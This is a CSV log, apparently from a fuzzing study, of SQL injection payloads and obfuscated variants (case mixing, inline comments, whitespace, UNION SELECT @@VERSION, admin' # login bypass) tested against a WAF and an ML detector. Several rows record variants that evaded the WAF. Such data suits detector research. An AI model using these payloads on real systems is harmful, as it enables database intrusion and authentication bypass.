Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
11,2025-10-23T16:40:41.640925,distinct,403,200,200,both_incorrect,dIsTInCt,2025-10-23T16:40:58.603484,200,200,both_incorrect,DistINCt,2025-10-23T16:41:17.215159,200,200,both_incorrect,dIsTInct,2025-10-23T16:41:35.362133,200,200,both_incorrect,disTiNCT,2025-10-23T16:41:52.519974,200,200,both_incorrect,dIStIncT,2025-10-23T16:42:09.916474,200,200,both_incorrect,diSTinCt,2025-10-23T16:42:27.496480,200,200,both_incorrect,DisTinCt,2025-10-23T16:42:45.153846,200,200,both_incorrect,DIStInCt,2025-10-23T16:43:01.590252,200,200,both_incorrect,dISTiNCT,2025-10-23T16:43:19.200652,200,200,both_incorrect,dISTINcT,2025-10-23T16:43:36.693195,200,200,both_incorrect
12,2025-10-23T16:43:54.979201,admin' or 1  =  1#,403,403,403,both_correct,"admin' OR (SELECT 1) LIKE 6821 
= /**/0x1#<",2025-10-23T16:44:12.952590,403,403,both_correct,"admin' Or (SeleCT (SELECT 0x1)) lIKE/**/9562!=9563 	 LIKE  /*Nu4*/0x1#<",2025-10-23T16:44:31.718682,403,403,both_correct,"admin' Or (sELECT (SelECt 0x1)) LIke/**/(sELECT
0x1)<>'R'<>'Rw' 	 liKE /**//*Nu4*/0x1#<./",2025-10-23T16:44:50.164146,403,403,both_correct,"admin' Or (sELECT (SelECt 0x1)) LIke (sELECT
0x1)<>'R'<>'Rw' 
 like /**//**/0x1#<./n",2025-10-23T16:45:08.384776,403,403,both_correct,"admin' Or (sELECT (SelECt 0x1)) LIke	(sELECT
0x1)<>'R'<>'Rw' 
 like/*/(*//**//**/0x1#<./n",2025-10-23T16:45:25.293752,403,403,both_correct,"admin' Or (sELECT (SelECt 0x1))	LIke	(sELECT
0x1)<>'R'<>'Rw' 
 LIke/*/(*//**/ 0x1#<./n^",2025-10-23T16:45:42.064535,403,403,both_correct,"admin' Or (sELECT/**/(SelECt 0x1))
LIke	(sELECT
0x1)<>'R'<>'Rw' 
 LIkE/*/(*//**/ 0x1#<./n^ aND (Select '}r' LIKE '}r')",2025-10-23T16:46:00.967012,403,403,both_correct,"admin' Or (sELECT/*}!*/(SelECt 0x1))
LIke
(sELECT
0x1)<>'R'<>'Rw' 
 LIkE/*/(*//**/ 0x1#<./n^ aND/**/(Select '}r' LIKE '}r')",2025-10-23T16:46:19.039734,403,403,both_correct,"admin' Or (sELECT/*}!*/(SelECt	0x1))
LIke
(sELECT
0x1)<>'R'<>'Rw' 
 LIkE/*/(*//**/ 0x1#<./n^ aND (Select '}r' LIKE '}r')z",2025-10-23T16:46:35.611639,403,403,both_correct,"admin' Or (sELECT/*}!*/(SelECt	0x1))
LIke
(sELECT
0x1)<>'R'<>'Rw' 
 LIkE/*/(*/  0x1#<./n^ aND (Select
'}r' LIKE '}r')z-",2025-10-23T16:46:52.409994,403,403,both_correct
13,2025-10-23T16:47:09.567084,admin' or '1'  =  '1,403,403,403,both_correct,"admin'	or ''K'='K''  =/**/ '(sElecT  OR 0)",2025-10-23T16:47:25.238618,200,403,waf_incorrect_ml_correct,"admin'
or ' OR 0x0'  =/**/ '(SeleCt/**/ or 'pPQ' NOT LIKE 'pPQh')",2025-10-23T16:47:43.398363,403,403,both_correct,"admin'
or ' oR 0x0'
 =/**/ '(SelEcT  Or 'pPQ' not like 'pPQh')",2025-10-23T16:48:00.192065,403,403,both_correct,"admin'
or ' or 0x0'
 =  '(SeLECt  oR 'pPQ'
not like 'pPQh')",2025-10-23T16:48:18.255578,403,403,both_correct,"admin'
or/**/' or 0x0'	 =  '(selecT  oR 'pPQ'
not like 'pPQh')",2025-10-23T16:48:35.640926,403,403,both_correct,"admin'
or/* OR 0x0:*/' oR 0x0'	/**/=  '(sELECt  or 'pPQ' not like 'pPQh')",2025-10-23T16:48:52.467347,403,403,both_correct,"admin'
or/**/' oR 0x0'	 =  '(seLEct  oR 'pPQ' not like 'pPQh')",2025-10-23T16:49:09.425765,403,403,both_correct,"admin'
or ' Or 0x0'  =  '(SeLEct  oR 'pPQ' not like 'pPQh')",2025-10-23T16:49:26.609124,403,403,both_correct,"admin'
or ' OR 0x0'  =
/**/'(SEleCT  or 'pPQ' not like 'pPQh')",2025-10-23T16:49:43.197877,403,403,both_correct,"admin'
or	' || 0x0'  =
 '(SELECt  Or 'pPQ' not like 'pPQh')",2025-10-23T16:49:59.883714,403,200,waf_correct_ml_incorrect
14,2025-10-23T16:50:16.388168," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",403,403,403,both_correct," sElECT * FROm users WherE id   LIKE   (SELEct 1) oR "",{"" oR/**/7768 NOT LIKE 7769 	=  1 --  AND 1",2025-10-23T16:50:33.030061,403,403,both_correct," sEleCT * frOM users/**/wheRE id   liKe   (seLECT 5960!=5961) Or "",{"" or/*hG=*/ OR 0 NOT LIKE 7769 	=  (SELECT 1) --  AND	1",2025-10-23T16:50:51.915513,403,403,both_correct," SELeCT * from users/**/wHErE id   LIKe   (seleCt 5960!=(SelECT 1)) OR "",{""/**/or/* v45*/ Or 'bB' not like
'bBe' NOT LIKE 7769 	=  (SELeCT (SELECT 1)) --  AND	1",2025-10-23T16:51:14.950114,403,403,both_correct," seleCt */**/FRoM users/**/wHErE id   liKe   (SeleCt 5960!=(seLeCt 1)) oR "",{""/**/oR/* v45*/ oR 'bB' not like 'bBe' not like 3961!= OR 0 	=  (SELEct (seLect 1)) --  AND	(SELECT 1)]",2025-10-23T16:51:33.055124,403,403,both_correct," SeLECT */**/fROM users/**/wHERe id   LiKe   (sElecT 5960!=(sElecT 1)) or/**/"",{""/**/oR/* v45*/ oR 'bB' not like 'bBe' not like 0xf79!= OR 2338=2338   lIke   (SeleCt (sElECt  Or 0)) --  AND	(SELECT 1)]7",2025-10-23T16:51:50.134171,403,403,both_correct," SeLeCt */**/FRoM users whERe id   LiKE   (seleCT 0x1748!=(sELEct 1294 not like 1295)) oR/**/"",{""/**/Or/* v45*/ oR 'bB' not like 'bBe' not like 0xf79!= or (SELECT 1)=2338   LIKe   (SeLeCT (SELect  or 0)) --  AND
(SELECT 1)]7%",2025-10-23T16:52:07.971385,403,403,both_correct," seLECT */**/FROM users wHEre id   LiKE   (SeLECt 0x1748!=(sElECT 1294 not like 1295)) oR "",{""/**/oR/* v45*/ oR 'bB' not like 'bBe' not like 0xf79!= or (SElECT (SELECT 1))=2338   like   (sElECT (sEleCt  Or 5560 not like 5561)) --  AND (SELECT  OR 0)]7% ",2025-10-23T16:52:24.904696,403,403,both_correct," SElect */**/frOM users wHErE id   LIKe	  (SelEct 0x1748 NOT LIKE (sELect  OR 0 not like 1295)) OR "",{""/**/or/*!M*/ or 'bB' not like/**/'bBe' not like 0xf79!= oR (SelEct (Select 0x1))=2338   lIKe   (SeLEcT (SELECT  OR 1855=1855 not like 5561)) --  AND (SELECT  OR 0)]7% ",2025-10-23T16:52:41.890472,403,403,both_correct," SeLEct */**/FROm users wHerE id   LIkE   (SEleCT 0x1748 NOT LIKE (SelEcT  OR 0 not like (sELEct ''=''))) or "",{""/*mpF*/or/*!M*/ OR 'bB' not like 'bBe' not like 0xf79 not like  or (SELECt (seLeCt 0x1))=2338   liKE   (SeLECt (SeleCT  Or 1855=1855 not like 5561)) --  AND (SELECT  OR 0)](SELECT 7)% ",2025-10-23T16:52:59.125485,403,403,both_correct," SelECT */**/fRoM users WhERe id   LIKE   (SELect 0x1748 NOT LIKE (SELEct  OR 0 not like (sEleCt ''=''))) Or "",{""/*mpF*/oR/*%}qRG*/ Or 'bB' not like 'bBe' not like 0xf79 not like  Or (seLect (sElECt 0x1))/**/LIKe 'g'<>'gm'   likE   (sELECt (selECT  or 1855=1855 not like (sElECt 1))) --
 ANd (seLECT  or 0)](SElect 0x7)% ",2025-10-23T16:53:16.697145,403,403,both_correct
15,2025-10-23T16:53:34.453871," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," sElecT * frOm users
whEre id   like   0x1 <@$$ union sELect (SELECT 1),version  ( /*UCr
*/  )   -- 'P' NOT LIKE 'PF'",2025-10-23T16:53:51.957212,403,403,both_correct," SELect * FrOm users
wHerE id   LiKE  	0x1 <@$$ union sELEct (seLeCT '(SELECT 0x1)' liKE '0'),version  (    )   -- 'P' NOT LIKE 'PF'G",2025-10-23T16:54:10.891563,403,403,both_correct," selEcT * fRom users WheRE id   lIKe  	0x1 <@$$ union SElECT (sElEct '(SELECT 0x1)' lIKe '(SELECT  OR 0!=6011)'),version /**/(    )   -- 'P' NOT LIKE 'PF'G",2025-10-23T16:54:28.093828,403,403,both_correct,"/**/sELECt * fROM users whERE id   LikE  	0x1 <@$$ union SElEct (sElect '(SELECT 0x1)' liKe	'(SELECT  OR 0x0!= OR 0)'),version /*S #""*/(    )   -- 'P' NOT LIKE 'PF'G",2025-10-23T16:54:44.829477,403,403,both_correct,"/**/SeLEct * frOM users wHEre id   LIKE  	0x1 <@$$ union SeLeCt (sElEcT '(SELECT 0x1)' LIke '(SELECT  OR/**/0x0!= OR 0x0)'),version /*S #""*/(    )   -- 'P' NOT LIKE 'PF'G\",2025-10-23T16:55:02.477335,403,403,both_correct,"/*MU+I*/sELECT * FrOM users WHerE id 
 Like  	0x1 <@$$ union SeLeCT (select '(SELECT 0x1)' LIKe '(SELECT  OR 0x0!= OR 0x0)'),version /*S #""*/(    )   -- 'P' NOT LIKE 'PF'G\",2025-10-23T16:55:19.352656,403,403,both_correct,"/*MU+I*/seLeCT * fROM users WHerE id 
 like  
0x1 <@$$ union SElECT (sELEcT '(SELECT 0x1)'/**/lIkE '(SELECT  OR 0x0!= OR 0x0)'),version /*S #""*/(    )   -- 'P' NOT LIKE 'PF'G\",2025-10-23T16:55:36.551215,403,403,both_correct,"/**/SeLECT * FrOm
users WHERe id 
 LIke  
0x1 <@$$ union seleCT (SeleCT '(SELECT 0x1)' LIkE '(SELECT  OR 0x0!= OR 0x0)'),version /*S #""*/(    )   -- 'P' NOT LIKE 'PF'G\E[",2025-10-23T16:55:54.685136,403,403,both_correct," SeLECt * fRom
users wHeRE id 
 Like  
0x1 <@$$ union SelecT (SELEcT '(SELECT 0x1)' likE '(SELECT  OR 0x0!= OR 0x0)'),version /*S #""*/(    )  
-- 'P' NOT LIKE 'PF'G\E[r",2025-10-23T16:56:13.186339,403,403,both_correct," sELEcT *	FRoM
users WheRe id 
 lIKE  
0x1 <@$$ union SELECT (sELEct '(SELECT 0x1)' lIkE '(SELECT  OR/**/0x0!= OR 0x0)'),version /**/(    )  
-- 'P' NOT LIKE 'PF'G\E[r9",2025-10-23T16:56:30.241451,403,403,both_correct
16,2025-10-23T16:56:47.583682,"or 1  =  1 or """"  =  ",403,200,200,both_incorrect,"OR (SELECT 0x1)	 =  '''=''' Or """"   LIKE /*M-?JH*/ ",2025-10-23T16:57:04.192362,403,403,both_correct,"OR (seLEct 0x1)	 = 	'''=''' OR """" /**/ like /*M-?JH*/ ",2025-10-23T16:57:22.507246,403,403,both_correct,"Or/**/(SElECt 0x1)	 = 	'''='''
oR """" /**/ LikE /*M-?JH*/ ",2025-10-23T16:57:39.993974,403,403,both_correct,"Or/**/(seLECt 0x1)	  like  	'''=''' or """"   LiKE /*M-?JH*/ ",2025-10-23T16:57:57.744087,403,403,both_correct,"OR (SELECt 0x1)
  lIke  	'''=''' oR """"   lIke /*[&*/ ",2025-10-23T16:58:15.671890,403,403,both_correct,"|| (sELECT 0x1)
  LIKe   '''=''' Or """"   LikE/**//**/ ",2025-10-23T16:58:32.846792,403,403,both_correct," OR  (SelEcT 0x1)
  likE   '''='''	or """"   LiKE/**//**//**/",2025-10-23T16:58:50.700238,403,403,both_correct," ||  (SeLecT 0x1)
  liKe /*l*/ '''=''' OR """"   LIkE/**//**//**/",2025-10-23T16:59:07.627246,403,403,both_correct,"  oR   (seLeCt
0x1)
 /**/LIke /**/ '''=''' oR """"   LIkE/**//**//**/",2025-10-23T16:59:25.380434,403,403,both_correct,"  Or   (seLECT
0x1)
 /**/LIke   '''=''' or
""""   liKE/**//**//**/",2025-10-23T16:59:42.603632,403,403,both_correct
17,2025-10-23T16:59:59.627315,and 1 in   (  select var from temp  )  --,403,200,403,waf_incorrect_ml_correct,"and  or 7599 LIKE 0x1daf/**/in   (  SElecT var from temp
 )  --",2025-10-23T17:00:15.940423,200,403,waf_incorrect_ml_correct,anD  oR  aND (SeLEcT 'S'='S') Like 0x1daf/**/In/**/  (  sElECt var FrOM temp  )  --,2025-10-23T17:00:33.805720,200,403,waf_incorrect_ml_correct,"&&  or  aND (SelEcT/**/ OR 0!=5025) lIKE 0x1daf/**/in/*p3y*/  (  seLEct
var FRom temp  )  --",2025-10-23T17:00:50.581035,200,403,waf_incorrect_ml_correct,"&&  OR  anD (seLECt/**/ Or '.'='.' NOT LIKE  AND 0x1) like	0x1daf In/*]*/  (  SelECt
var FroM temp  )  --",2025-10-23T17:01:08.047325,200,403,waf_incorrect_ml_correct,"&&  or  and (sElEcT  oR '.'='.' NOT LIKE  And 0x1) lIke	0x1daf iN/**/	 (  SeLecT
var FRoM temp  )  --",2025-10-23T17:01:25.356037,200,403,waf_incorrect_ml_correct," AND   OR  ANd (SEleCt  Or '.'='.' NOT LIKE  and 0x1) liKe	0x1daf in 
 (  SELeCT
var fROM temp  )  --",2025-10-23T17:01:43.920322,403,403,both_correct," aND/*4bm&*/  or  and (SELeCT  Or '.' like '.' NOT LIKE  And 0x1) LiKe	0x1daf IN 
 (  SeLect var fROm temp  )  --",2025-10-23T17:02:00.540872,403,403,both_correct," ANd/**/  or  And (SeLect  or '.' likE '.' not like  And 0x1) lIkE	0x1daf in

 (  SeLecT/**/var fRom temp  )  --",2025-10-23T17:02:17.137642,403,403,both_correct," and   or  AnD (seLEct  or '.' Like '.' not like  aND 0x1) lIKe
0x1daf iN

 (  SElEcT/**/var FrOm temp  )  --",2025-10-23T17:02:34.409316,403,403,both_correct," AnD   or  aND (SELecT  or '.' LIke '.' not like/**/ AnD 0x1) LIKe
0x1daf iN

 ( 
SelecT/*'j7)'<>'j7)(SELECT 4)'!*/var fRoM temp  )  --",2025-10-23T17:02:51.972969,403,403,both_correct
18,2025-10-23T17:03:08.703652," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",403,403,200,waf_correct_ml_incorrect," SelEct * frOM users WhErE id   LiKE   '(SELECT 1)'/**/union SeLeCT $*$,@@VERSION --	 AND 637 IN (636,637,638)'",2025-10-23T17:03:24.943349,403,403,both_correct," sElEcT	* frOM users wHERE id   LIKE   '(SELECT  AND 1)'/**/union seLEct $*$,@@VERSION/**/--	 AND 637 IN (3168 LIKE 3168,637,(SELECT 638))'",2025-10-23T17:03:43.976418,403,403,both_correct," sELecT	* fRoM users whERE id /**/ LIke   '(SELECT  AND  AND 1)'/**/union SELECT $*$,@@VERSION/**/--  AND 637 IN (3168 LIKE 3168,(SELECT ';s`b' LIKE ';s`b'),(SELECT 638))'",2025-10-23T17:04:01.237495,403,403,both_correct," seLEct
* From users wheRE id /**/ LiKe   '(SELECT  AND  AND 1)'/**/union sELecT $*$,@@VERSION/**/--  AND (SELECT  AND 1) IN (4013=4013 LIKE 3168,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 638))'V\",2025-10-23T17:04:17.965981,403,403,both_correct," seLecT
* fRom	users WHErE id /**/ liKe   '(SELECT  AND  AND 1)' union seLECt $*$,@@VERSION/**/--  AND (SELECT  AND  AND 1) IN (4013=4013 LIKE 3168,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 6553<>(SELECT 6554)))'V\M",2025-10-23T17:04:35.518548,403,403,both_correct," SeLect	* FRoM	users whErE id /**/ lIKe   '(SELECT  AND  AND  AND 1)' union sELeCT $*$,@@VERSION/**/--  AND (SELECT/**/ AND  AND 9945=9945) IN (4013=4013 LIKE 3168,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 6553<>(SELECT (SELECT 6554))))'V\M",2025-10-23T17:04:53.132863,403,403,both_correct," SElecT	* froM	users
wheRE id /**/ LiKe   '(SELECT  AND  AND  AND '%Zd'<>'%ZdW')' union SelECT $*$,@@VERSION/**/--  AND/**/(SELECT/*""K^}*/ AND  AND 9945=9945) IN (4013=0xfad LIKE  AND 1,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 6553<>(SELECT (SELECT 6554))))'V\M",2025-10-23T17:05:09.770459,403,403,both_correct," sELeCt
* frOm	users
wheRE id /**/ LIkE   '(SELECT  AND  AND  AND/**/'%Zd'<>'%ZdW')' union select $*$,@@VERSION/**/--  AND/**/(SELECT/**/ AND  AND 9945=9945) IN ((SELECT 4013)=0xfad LIKE  AND 1,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 6553<>(SELECT (SELECT 6914 NOT LIKE  AND 1))))'V\M,b",2025-10-23T17:05:26.674712,403,403,both_correct," sELECT * from	users
wHERe id /*H*/ liKe   '(SELECT  AND  AND  AND/**/'%Zd'<>'%ZdW')' union SeleCT $*$,@@VERSION/**/--  AND (SELECT/**/ AND  AND 9945=9945) IN ((SELECT 4013)=0xfad LIKE  AND 0x1,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 7409 IN (7408, AND 1,7410)<>(SELECT (SELECT 6914 NOT LIKE  AND 1))))'V\M,b",2025-10-23T17:05:43.984684,403,403,both_correct," sELect * from users
WHErE id /**/ liKe   '(SELECT  AND  AND  AND/**/'%Zd'<>'%ZdW')' union sElEcT $*$,@@VERSION/**/--  AND (SELECT  AND  AND 9945=0x26d9) IN ((SELECT '_O'<>'_Ox')=0xfad LIKE  AND 0x1,(SELECT ';s`b'/**/LIKE ';s`b'),(SELECT 7409 IN (7408, AND 1, OR 0)<>(SELECT (SELECT 6914 NOT LIKE  AND 1))))'V\M,bC",2025-10-23T17:06:02.035042,403,403,both_correct
19,2025-10-23T17:06:19.706878,admin' #,403,200,403,waf_incorrect_ml_correct,admin'/*1bI-*/#,2025-10-23T17:06:35.608433,200,403,waf_incorrect_ml_correct,admin'/**/#,2025-10-23T17:06:53.473184,200,403,waf_incorrect_ml_correct,"admin'
#X",2025-10-23T17:07:11.149360,200,403,waf_incorrect_ml_correct,"admin'	#X<",2025-10-23T17:07:29.106029,200,403,waf_incorrect_ml_correct,admin' #X<QN,2025-10-23T17:07:46.883992,200,403,waf_incorrect_ml_correct,admin'/*=(ocH*/#X<QN,2025-10-23T17:08:03.393049,200,403,waf_incorrect_ml_correct,admin'/*=(ocH*/#X<QNX,2025-10-23T17:08:20.879603,200,403,waf_incorrect_ml_correct,admin'/*=(ocH*/#X<QNXS,2025-10-23T17:08:37.770381,200,403,waf_incorrect_ml_correct,admin'/*=(ocH*/#X<QNXS,2025-10-23T17:08:55.104615,200,403,waf_incorrect_ml_correct,admin'/*=(ocH*/#X<QNXSa.,2025-10-23T17:09:12.112938,200,403,waf_incorrect_ml_correct
20,2025-10-23T17:09:29.946661,"""a"""" or 1  =  1--""",403,200,403,waf_incorrect_ml_correct,"""a""""
or (SELECT (SELECT 1))  =  '*""S/'/**/NOT LIKE '*""S/,'--""",2025-10-23T17:09:46.305379,200,403,waf_incorrect_ml_correct,"""a""""
or (SELECT (SELECT 0x1)) 	=  '*""S/' NOT LIKE '*""S/,'--""",2025-10-23T17:10:04.720584,200,403,waf_incorrect_ml_correct,"""a""""
or/*))7|O*/(SELECT (SELECT 0x1)) 	=  '*""S/' NOT	LIKE '*""S/,'--""",2025-10-23T17:10:22.079042,200,403,waf_incorrect_ml_correct,"""a""""	or/*))0x7|O*/(SELECT (SELECT 0x1)) 	=  '*""S/' NOT	LIKE/**/'*""S/,'--""",2025-10-23T17:10:40.530952,200,403,waf_incorrect_ml_correct,"""a""""	or/*))0x7|O*/(SELECT (SELECT 0x1)) 
=  '*""S/' NOT	LIKE '*""S/,'--""",2025-10-23T17:10:58.763242,200,403,waf_incorrect_ml_correct,"""a""""	or/*))0x7|O*/(SELECT (SELECT
0x1))/**/
=  '*""S/' NOT	LIKE '*""S/,'--""",2025-10-23T17:11:17.249720,200,403,waf_incorrect_ml_correct,"""a""""	or/*))0x7|O*/(SELECT (SELECT	0x1))/**/
=  '*""S/' NOT	LIKE/*[*/'*""S/,'--""",2025-10-23T17:11:35.930882,200,403,waf_incorrect_ml_correct,"""a"""" or/*))0x7|O*/(SELECT (SELECT	0x1))/*V9{)*/
=  '*""S/' NOT	LIKE '*""S/,'--""",2025-10-23T17:11:53.278964,200,403,waf_incorrect_ml_correct,"""a"""" or/*))0x7|O*/(SELECT (SELECT	0x1))/*V9{)*/
=  '*""S/' NOT LIKE/**/'*""S/,'--""",2025-10-23T17:12:11.339859,200,403,waf_incorrect_ml_correct,"""a""""/**/or/*))0x7|O*/(SELECT (SELECT
0x1))/*V9{)*/
=  '*""S/' NOT LIKE/**/'*""S/,'--""",2025-10-23T17:12:29.978803,200,403,waf_incorrect_ml_correct
21,2025-10-23T17:12:48.745818,hi' or 'x'  =  'x',403,403,403,both_correct,hi'/**/oR  or 0x0,2025-10-23T17:13:05.767450,200,403,waf_incorrect_ml_correct,"hi'/**/oR/**/	Or 0x0",2025-10-23T17:13:24.267785,200,403,waf_incorrect_ml_correct,"hi'/**/or 	oR
0x0",2025-10-23T17:13:42.797850,200,403,waf_incorrect_ml_correct,"hi'/**/OR/**/
OR
0x0",2025-10-23T17:14:01.676908,200,403,waf_incorrect_ml_correct,"hi'/**/or/**/
or/**/0x0",2025-10-23T17:14:18.811239,200,403,waf_incorrect_ml_correct,hi'/**/or/**//**/oR/**/0x0,2025-10-23T17:14:36.625879,200,403,waf_incorrect_ml_correct,hi'/**/OR/**//**/oR 0x0,2025-10-23T17:14:54.665840,200,403,waf_incorrect_ml_correct,"hi'/**/|| /*<_*/or
0x0",2025-10-23T17:15:12.414471,200,403,waf_incorrect_ml_correct,hi'  or  /**/oR 0x0,2025-10-23T17:15:30.505166,200,403,waf_incorrect_ml_correct,"hi' 
Or /**//**/|| 0x0",2025-10-23T17:15:48.732891,200,403,waf_incorrect_ml_correct
22,2025-10-23T17:16:06.891518," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",403,403,403,both_correct," SELECT * frOm users WhErE id
 =   OR 0 + $+*\ union/**/SElECT null,@@VERSION -- 0x13B",2025-10-23T17:16:24.131765,403,403,both_correct," SELEct * FROm users
WherE id
  LIke    oR 0x0 + $+*\ union SELeCt null,@@VERSION -- 0x13B",2025-10-23T17:16:44.027057,403,403,both_correct," SELect * FROM users
wHEre id
  LiKE    OR 0x0
+ $+*\ union/**/seLeCt null,@@VERSION -- 0x13B$=",2025-10-23T17:17:01.766526,403,403,both_correct," sElECT * FrOM users
WhEre id
  LiKe    Or 0x0 + $+*\ union SELECT null,@@VERSION -- 0x13B$=",2025-10-23T17:17:19.329425,403,403,both_correct," sELecT * FRoM/**/users wHerE id
  Like    or 0x0 + $+*\ union sELEct null,@@VERSION -- 0x13B$=3232=3232",2025-10-23T17:17:37.471503,403,403,both_correct," SElECt */*(*/FROm/**/users where id
  liKE 
  oR 0x0 + $+*\ union selECT null,@@VERSION -- 0x13B$= AND (SELECT 1)='$' NOT LIKE '$p'",2025-10-23T17:17:56.070512,403,403,both_correct," SEleCT/**/*/*(*/fRoM/**/users WHErE id
  liKE 
 	OR 0x0 + $+*\ union select null,@@VERSION -- 0x13B$= AND (SELECT  OR 0xa91=2705)='$' NOT LIKE '$p')",2025-10-23T17:18:14.639866,403,403,both_correct," sElECT/**/*/*(*/fROM/**/users wHeRE/*<S>*/id
  Like 
  || 0x0 + $+*\ union SEleCT null,@@VERSION -- 0x13B$= AND (SELECT  OR 0xa91=4935 IN ( AND 1,4935,(SELECT 4936)))='$' NOT LIKE '$p')",2025-10-23T17:18:32.685659,403,403,both_correct," sElEcT/**/*/*(*/fRoM/*f*/users wHERE id	  lIkE 
   or  0x0 + $+*\ union seleCT null,@@VERSION -- 0x13B$= AND (SELECT  OR 0xa91=4935 IN ( AND 0x1, OR 0,(SELECT 'dT^C'='dT^C')))='$' NOT LIKE '$p')",2025-10-23T17:18:50.101431,403,403,both_correct," sElEct */*(*/FrOM/**/users wHeRE id	  liKE 
   oR  0x0 + $+*\ union seLECT null,@@VERSION -- 0x13B$= AND (SELECT  OR 0xa91=4935 IN ( AND 0x1,
OR 0x0,(SELECT 'dT^C'='dT^C'))) LIKE '$' NOT LIKE '$p') AND 1 LIKE 1782*",2025-10-23T17:19:08.439902,403,403,both_correct
